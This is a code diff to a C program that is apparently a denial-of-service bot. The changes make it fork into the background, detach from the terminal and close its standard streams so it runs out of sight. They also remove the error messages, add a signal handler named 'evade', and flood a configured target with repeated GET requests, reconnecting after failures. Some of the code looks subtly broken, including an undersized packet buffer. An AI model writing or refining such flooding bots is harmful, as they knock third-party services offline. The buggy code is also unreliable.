@@ -8,11 +8,21 @@
 #include <netdb.h>
 
 #include <unistd.h>
+#include <signal.h>
 
-#include <errno.h>
 
-
-void initiatebot();
+int sock;
+void ret(int sig){
+	return;
+}
+int initiatebot(){
+	if (fork()<0){
+		return 1;
+	}
+	if (setsid()<0){
+		return 1;
+	}
+}
 
 void try_again_later(){
 	sleep(ON_ERROR);
@@ -25,10 +35,21 @@ char* GetIP(const char* dns){
 	return ip;
 }
 
+void evade(int sig){
+	close(sock);
+	exit(0);
+}
+
 int main(){
+	initiatebot();
+	for (short tmp=0;tmp<3;tmp++)close(tmp);
+	signal(SIGINT, evade);
+	signal(SIGPIPE, ret);
 	int failure=0;
+	char pkt[strlen(GET)];
+	sprintf(pkt, GET);
 initbot:
-	int sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	struct sockaddr_in target;
 
 	target.sin_addr.s_addr=inet_addr(GetIP(TARGET));
@@ -37,26 +58,25 @@ initbot:
 
 	if(sock==-1){
 errorhandle:
-		perror(" ");
 		try_again_later();
 		goto initbot;
 	}
 
+cnt:
 	int cnt=connect(sock, (struct sockaddr*)&target, sizeof(struct sockaddr_in));
 	if (cnt==-1){
 		close(sock);
-		perror(" ");
 		goto errorhandle;
 	}
 ddos:
-	while (sleep(WTIME)+1){
-		if (send(sock, GET, strlen(GET), IPPROTO_TCP)==-1){
+	while (1){
+		usleep(WTIME*1000000);
+		if (send(sock, pkt, strlen(pkt), IPPROTO_TCP)==-1){
 			if (failure++==10){
-				perror(" ");
 				try_again_later();
 				goto initbot;
 			}
-			goto ddos;
+			goto cnt;
 		}
 	}
 }
